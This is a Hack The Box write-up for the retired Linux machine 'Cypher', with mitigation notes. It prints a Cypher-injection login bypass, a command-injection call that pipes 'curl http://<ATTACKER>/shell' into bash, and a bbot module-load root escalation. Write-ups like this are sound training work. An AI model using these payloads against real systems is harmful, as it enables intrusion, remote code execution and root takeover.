---
machine: Cypher
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, neo4j, cypher-injection, apoc, jar, bbot, privesc]
---

# Cypher — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The Neo4j app allows a login bypass with Cypher injection. A downloadable APOC extension JAR contains `custom.getUrlStatusCode`, which concatenates the URL into a shell command; abuse it to run commands as `neo4j`. The `neo4j` password is in `.bash_history` and is reused for `graphasm`, who can run `bbot` as root and load an arbitrary Python module.

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` OpenSSH and `80` nginx/Apache with a graph database site.
- `cypher.htb` resolves to the host; `/api` redirects to `/api/docs` and `/api/auth` only accepts POST.
- A custom extension JAR is linked from the site.

## Enumeration

Download and decompile the JAR. The extension class registers `custom.getUrlStatusCode`, which builds `curl -s -o /dev/null -w %{http_code} <url>` through `/bin/sh -c` without sanitizing. Login uses a Cypher query comparing the password SHA1 with the user's `SECRET` node.

## Foothold

Bypass login with `' OR true RETURN "<SHA1>" AS hash;//` using the SHA1 of a known password. Then call the vulnerable method with a URL that terminates the command and runs a reverse shell. The session is `neo4j`; `script /dev/null -c bash` stabilizes the TTY.

```bash
# login bypass
' OR true RETURN "<SHA1>" AS hash;//
# extension RCE
CALL custom.getUrlStatusCode("cypher.htb; curl http://<ATTACKER>/shell | bash; ") YIELD statusCode RETURN statusCode;
# root with bbot
printf 'modules:\n  - ExploitModule\nmodule_dirs:\n  - /dev/shm/\n' > /dev/shm/p.yml
echo 'import os; os.system("bash")' > /dev/shm/ExploitModule.py
sudo bbot -p /dev/shm/p.yml
```

## Lateral movement

`neo4j`'s `.bash_history` contains the `neo4j-admin dbms set-initial-password` command, and that password works for `graphasm` through `su` and SSH.

## Privilege escalation

`graphasm` can run `bbot` as root. `bbot -p <profile>` loads a YAML with `modules` and `module_dirs`; point it at a writable directory and create `ExploitModule.py` with top-level code, and `bbot` imports it before validating the class, executing as root.

## Evidence

- JAR with vulnerable `getUrlStatusCode`.
- Cypher bypass and RCE as `neo4j`.
- Password in `.bash_history` and reuse on `graphasm`.
- `bbot` module load as root.

## Lessons learned

- Database extensions widen the attack surface.
- Cypher injection can change authentication logic.
- Shell history is a credential source.
- Tools loading plugins from controllable paths are dangerous with privileges.

## Mitigation and detection

- Do not expose extension JARs or the Neo4j console.
- Parameterize Cypher queries and validate identity.
- Clear history and avoid reusing service passwords.
- Run `bbot` unprivileged and restrict `module_dirs`.

## References

- [0xdf — Cypher](https://0xdf.gitlab.io/2025/07/26/htb-cypher.html)
- [IppSec — Cypher](https://www.youtube.com/watch?v=L7Amlj9DKm8)
- [Hack The Box — Cypher](https://app.hackthebox.com/machines/cypher)
